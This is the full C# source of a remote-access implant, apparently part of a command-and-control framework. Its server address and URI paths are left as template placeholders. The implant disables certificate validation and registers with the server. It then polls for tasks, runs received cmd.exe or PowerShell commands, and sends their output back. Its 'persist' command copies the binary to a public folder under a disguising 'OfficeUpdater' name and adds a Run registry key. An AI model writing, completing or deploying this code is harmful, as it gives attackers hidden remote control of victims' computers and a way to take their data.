using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

public class Implant
{
    private static HttpClient client;
    private static string ip = "§IP§";
    private static string port = "§PORT§";
    private static string uriReg = "§URIG§";
    private static string uriRes = "§URIS§";
    private static string uriTas = "§URIT§";
    

    private static int n = 3;
    private static string name = "";

    static void Main()
    {

        Start().Wait();

    }

    public static async Task Start()
    {

        var handlerCert = new HttpClientHandler()
        {
            ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
        };


        client = new HttpClient(handlerCert);

        string hname = Dns.GetHostName();
        string type = "p";
        string uri = "https://" + ip + ":" + port;
        string regl = uri + "/" + uriReg;
        var data = new Dictionary<string, string>
        {
            { "name", hname },
            { "type", type }
        };

        //register itself to the server
        var response = await client.PostAsync(regl, new FormUrlEncodedContent(data));
        name = await response.Content.ReadAsStringAsync();

        //get the name assigned by the server
        string resultl = uri + "/" + uriRes + "/" + name;
        string taskl = uri + "/" + uriTas + "/" + name;

        Console.WriteLine("Connected to the server on " + ip + ":" + port);
        Console.WriteLine("|- My name is " + name);



        while (true)
        {
            var taskResponse = await client.GetStringAsync(taskl);
            if (!string.IsNullOrEmpty(taskResponse))
            {
                var taskParts = taskResponse.Split();
                string flag = taskParts[0];

                if (flag == "VALID")
                {
                    string command = taskParts[1];
                    string[] args = new string[taskParts.Length - 2];
                    Array.Copy(taskParts, 2, args, 0, args.Length);

                    if (command == "shell" || command == "powershell")
                    {
                        string f = command == "shell" ? "cmd.exe" : "powershell.exe";
                        string arg = "/c ";
                        foreach (var a in args)
                        {
                            arg += a + " ";
                        }

                        Console.WriteLine("|- Recived command " + arg);

                        int maxLength = 2000; // Imposta la lunghezza massima dei dati da inviare
                        string res = Shell(f, arg); // Esegue il comando e ottiene l'output

                        if (res.Length > maxLength)
                        {
                            res = res.Substring(0, maxLength); // Tronca l'output
                        }

                        var resultData = new Dictionary<string, string> { { "result", res } };
                        await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));

                    }
                    else if (command == "sleep")
                    {
                        n = int.Parse(args[0]);
                        var resultData = new Dictionary<string, string> { { "result", "" } };
                        Console.WriteLine("|- Going to sleep for " + n + " seconds");


                        await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));
                    }
                    else if (command == "rename")
                    {
                        name = args[0];
                        Console.WriteLine("|- My new name is " + name);

                        resultl = uri + "/" + uriRes + "/" + name;
                        taskl = uri + "/" + uriTas + "/" + name;


                        var resultData = new Dictionary<string, string> { { "result", "" } };
                        await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));
                    }
                    else if (command == "persist")
                    {
                        string fOri = System.Reflection.Assembly.GetExecutingAssembly().Location;
                        string fDest = @"C:\users\public\OfficeUpdater.exe";
                        string rKey = @"HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";

                        string payload = "Copy-Item -Path \"" + fOri + "\" -Destination \"" + fDest + "\"; Set-ItemProperty -Path \"" + rKey + "\" -Name OfficeUpd1a -Value \"" + fDest + "\"";   
    

                        string res = Shell("powershell", payload); // Esegue il comando e ottiene l'output
                        //Ok, no errors
                        if (res.Length == 8) res += "Persistence has been created";

                        var resultData = new Dictionary<string, string> { { "result", res } };
                        await client.PostAsync(resultl, new FormUrlEncodedContent(resultData));


                    }
                    else if (command == "rename")
                    {

                    }

                    else if (command == "quit")
                    {
                        Environment.Exit(0);
                    }
                }
            }

            await Task.Delay(n * 1000); // Sleep for n seconds
        }
    }

    private static string Shell(string fileName, string arguments)
    {
        var processStartInfo = new ProcessStartInfo
        {
            FileName = fileName,
            Arguments = arguments,
            RedirectStandardError = true,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (var process = new Process())
        {
            process.StartInfo = processStartInfo;
            process.Start();
            string stdout = process.StandardOutput.ReadToEnd();
            string stderr = process.StandardError.ReadToEnd();
            process.WaitForExit();
            return "VALID " + stdout + Environment.NewLine + stderr;
        }
    }


}
